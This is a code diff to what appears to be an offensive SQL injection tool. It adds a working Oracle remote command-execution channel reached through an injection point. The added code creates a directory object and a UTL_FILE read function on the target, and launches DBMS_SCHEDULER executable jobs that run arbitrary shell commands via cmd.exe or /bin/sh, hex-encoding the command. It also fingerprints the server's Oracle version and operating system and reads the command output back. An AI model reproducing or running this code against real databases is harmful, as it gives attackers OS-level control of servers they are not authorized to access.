@@ -541,7 +541,14 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             }
             if (config.DataConfig.SelectedDBType.Equals(DBType.Oracle))
             {
-                await ExecuteCmdOracle(config, vm).ConfigureAwait(false);
+                if ((vm.SelectedCmdMethod ?? "").Contains("SCHEDULER", StringComparison.OrdinalIgnoreCase))
+                {
+                    await ExecuteCmdOracleScheduler(config, vm).ConfigureAwait(false);
+                }
+                else
+                {
+                    await ExecuteCmdOracle(config, vm).ConfigureAwait(false);
+                }
                 return;
             }
             if (config.DataConfig.SelectedDBType.Equals(DBType.H2))
@@ -1649,7 +1656,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 }
                 else
                 {
-                    Log.Warning("Java通道自检未通过（SqliEval无预期回显）！可能原因：账号无CREATE PROCEDURE权限/DBMS_JAVA不可用/dbms_xmlquery被移除。回显：" + probe);
+                    Log.Warning("Java通道自检未通过（SqliEval无预期回显）！可能原因：账号无CREATE PROCEDURE权限/DBMS_JAVA不可用/dbms_xmlquery被移除。可改用「DBMS_SCHEDULER命令执行(免JVM)」通道重试。回显：" + probe);
                 }
             }
             catch (Exception e)
@@ -1675,7 +1682,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 {
                     if (major >= 18)
                     {
-                        Log.Warning("Oracle " + major + " 起 DBMS_XMLQUERY 已弃用（21c+移除/拒绝PL/SQL块），GETXML通道大概率不可用，继续尝试但请勿抱期望……");
+                        Log.Warning("Oracle " + major + " 起 DBMS_XMLQUERY 已弃用（21c+移除/拒绝PL/SQL块），GETXML通道大概率不可用，继续尝试但请勿抱期望……无JVM场景可改用「DBMS_SCHEDULER命令执行(免JVM)」通道（限9i~19c）。");
                     }
                     else if (major >= 12)
                     {
@@ -1692,6 +1699,134 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             }
             await ProvisionOracleJava(config).ConfigureAwait(false);
             _oraJavaReadyKey = targetKey;
+        }
+
+        //==================== Oracle DBMS_SCHEDULER 通道（命令执行，免JVM）====================
+        //原理：GETXML原语部署DDL → CREATE DIRECTORY + UTL_FILE读文件函数 → scheduler EXECUTABLE job
+        //（run_job use_current_session=true 同步执行）调 cmd/sh 把输出重定向到目录文件 → SELECT读函数取回。
+        //核心价值场景：XE全版本无JVM、12c/19c 无JVM或CREATE PROCEDURE被拒但CREATE JOB可用。
+        //适用：9i~19c；21c+/23ai 因DBMS_XMLQUERY移除导致GETXML原语不可用，无法部署（明确报不支持）。
+        //前提：CREATE JOB + CREATE DIRECTORY 权限；返回值限varchar2(4000)。
+
+        /// <summary>Oracle SCHEDULER通道已部署目标标识（避免每次命令重复部署）</summary>
+        private static string? _oraSchedReadyKey = null;
+
+        /// <summary>Oracle服务器是否Windows平台（决定cmd /c 还是 /bin/sh -c，以及输出目录）</summary>
+        private static bool _oraSchedIsWindows = false;
+
+        private const string OraSchedDirName = "SQLI_OUT_DIR";
+        private const string OraSchedOutFile = "sqli_cmd_out.txt";
+        private const string OraSchedJobName = "SQLI_CMD_JOB";
+
+        /// <summary>UTL_FILE读文件函数DDL（返回值限varchar2(4000)，幂等or replace）</summary>
+        private const string OraReadOutFuncDdl =
+            "create or replace function SqliReadOut(p in varchar2) return varchar2 is " +
+            "f utl_file.file_type; buf varchar2(32767); ret varchar2(4000); begin " +
+            "f := utl_file.fopen('" + OraSchedDirName + "', p, 'R'); " +
+            "begin loop utl_file.get_line(f, buf); ret := ret || buf || chr(10); exit when length(ret) >= 3900; end loop; " +
+            "exception when no_data_found then null; when others then null; end; " +
+            "if utl_file.is_open(f) then utl_file.fclose(f); end if; return ret; end;";
+
+        /// <summary>SCHEDULER通道输出文件的完整OS路径</summary>
+        private static string OraSchedOutPath =>
+            (_oraSchedIsWindows ? @"C:\Windows\Temp\" : "/tmp/") + OraSchedOutFile;
+
+        /// <summary>通过SCHEDULER EXECUTABLE job同步执行OS命令（输出重定向到目录文件，auto_drop自动清理job）</summary>
+        private static async Task RunOracleSchedulerCmd(AppConfig config, string cmd)
+        {
+            string shell = _oraSchedIsWindows ? @"C:\Windows\System32\cmd.exe" : "/bin/sh";
+            string shellArg = _oraSchedIsWindows ? "/c" : "-c";
+            string full = cmd + " > " + OraSchedOutPath + " 2>&1";
+            string fullHex = Convert.ToHexString(Encoding.UTF8.GetBytes(full));
+            string plsql =
+                "begin " +
+                "begin dbms_scheduler.drop_job('" + OraSchedJobName + "', true); exception when others then null; end; " +
+                "dbms_scheduler.create_job(job_name=>'" + OraSchedJobName + "', job_type=>'EXECUTABLE', job_action=>'" + shell + "', number_of_arguments=>2, enabled=>false, auto_drop=>true); " +
+                "dbms_scheduler.set_job_argument_value('" + OraSchedJobName + "', 1, '" + shellArg + "'); " +
+                "dbms_scheduler.set_job_argument_value('" + OraSchedJobName + "', 2, utl_raw.cast_to_varchar2(hextoraw('" + fullHex + "'))); " +
+                "dbms_scheduler.run_job('" + OraSchedJobName + "', true); " +
+                "end;";
+            await FetchScalar(config, OraGetXmlExec(plsql)).ConfigureAwait(false);
+        }
+
+        /// <summary>确保Oracle SCHEDULER通道就绪（同目标只部署一次；21c+明确告警）</summary>
+        private static async Task EnsureOracleSchedulerReady(AppConfig config)
+        {
+            string targetKey = config.RequestTxt ?? "";
+            if (string.Equals(_oraSchedReadyKey, targetKey, StringComparison.Ordinal))
+            {
+                return;
+            }
+            try
+            {
+                string banner = await FetchScalar(config, "(select banner from v$version where rownum=1)").ConfigureAwait(false);
+                Log.SysLog("Oracle版本：" + (banner ?? ""));
+                var m = System.Text.RegularExpressions.Regex.Match(banner ?? "", @"(\d+)[a-z]?\.(\d+)", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
+                if (m.Success && int.TryParse(m.Groups[1].Value, out int major) && major >= 21)
+                {
+                    Log.Warning("Oracle " + major + " 起 DBMS_XMLQUERY 已移除，GETXML原语不可用，SCHEDULER通道无法部署（本通道仅适用9i~19c），请勿抱期望……");
+                }
+            }
+            catch (Exception)
+            {
+            }
+            //OS判定：port_string含WIN按Windows通道（cmd /c + C:\Windows\Temp），否则 /bin/sh -c + /tmp
+            try
+            {
+                string port = await FetchScalar(config, "(select dbms_utility.port_string from dual)").ConfigureAwait(false);
+                _oraSchedIsWindows = (port ?? "").Contains("WIN", StringComparison.OrdinalIgnoreCase);
+                Log.SysLog("Oracle服务器OS：" + (string.IsNullOrEmpty(port) ? "未知（按Linux/Unix处理）" : port));
+            }
+            catch (Exception)
+            {
+            }
+            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Blind) || config.DataConfig.SelectedInjectType.Equals(InjectType.Time))
+            {
+                Log.Show("提示：盲注通道部署SCHEDULER过程较慢（取值需多次求值），建议优先Union通道……");
+            }
+            Log.Show("正在通过 GETXML 原语部署 DBMS_SCHEDULER 通道（目录对象+读文件函数）……");
+            await FetchScalar(config, OraGetXmlExec("create or replace directory " + OraSchedDirName + " as '" + (_oraSchedIsWindows ? @"C:\Windows\Temp" : "/tmp") + "'")).ConfigureAwait(false);
+            await FetchScalar(config, OraGetXmlExec(OraReadOutFuncDdl)).ConfigureAwait(false);
+            try
+            {
+                await RunOracleSchedulerCmd(config, "echo sqli_sched_ok").ConfigureAwait(false);
+                string probe = await FetchScalar(config, "(select SqliReadOut('" + OraSchedOutFile + "') from dual)").ConfigureAwait(false);
+                if ((probe ?? "").Contains("sqli_sched_ok", StringComparison.Ordinal))
+                {
+                    Log.Success("Oracle SCHEDULER通道自检通过（免JVM命令执行已可用）！");
+                }
+                else
+                {
+                    Log.Warning("SCHEDULER通道自检未通过（无预期回显）！可能原因：账号无CREATE JOB/CREATE DIRECTORY权限/dbms_xmlquery被移除。回显：" + probe);
+                }
+            }
+            catch (Exception e)
+            {
+                Log.Warning("SCHEDULER通道自检异常：" + e.Message);
+            }
+            _oraSchedReadyKey = targetKey;
+        }
+
+        /// <summary>Oracle DBMS_SCHEDULER命令执行（免JVM，首次自动部署目录对象+读文件函数）</summary>
+        private static async Task ExecuteCmdOracleScheduler(AppConfig config, FileCmdViewModel vm)
+        {
+            try
+            {
+                await EnsureOracleSchedulerReady(config).ConfigureAwait(false);
+                Log.SysLog("命令已执行（DBMS_SCHEDULER通道）：" + vm.CmdText);
+                await RunOracleSchedulerCmd(config, vm.CmdText).ConfigureAwait(false);
+                string result = await FetchScalar(config, "(select SqliReadOut('" + OraSchedOutFile + "') from dual)").ConfigureAwait(false);
+                vm.SetCmdResult(result);
+                ShowResultLen("命令执行完成，获取到结果长度：", (result ?? "").Length, "（varchar2上限4000字符；无需自行加 cmd /c 或 /bin/sh -c，通道已自动包装）");
+            }
+            catch (OperationCanceledException)
+            {
+                Log.Show("已停止命令执行！");
+            }
+            catch (Exception e)
+            {
+                Log.Show("命令执行发生异常：" + e.ToString());
+            }
         }
 
         /// <summary>Oracle/DM Java命令执行（GETXML通道，首次自动部署SqliUtil）</summary>
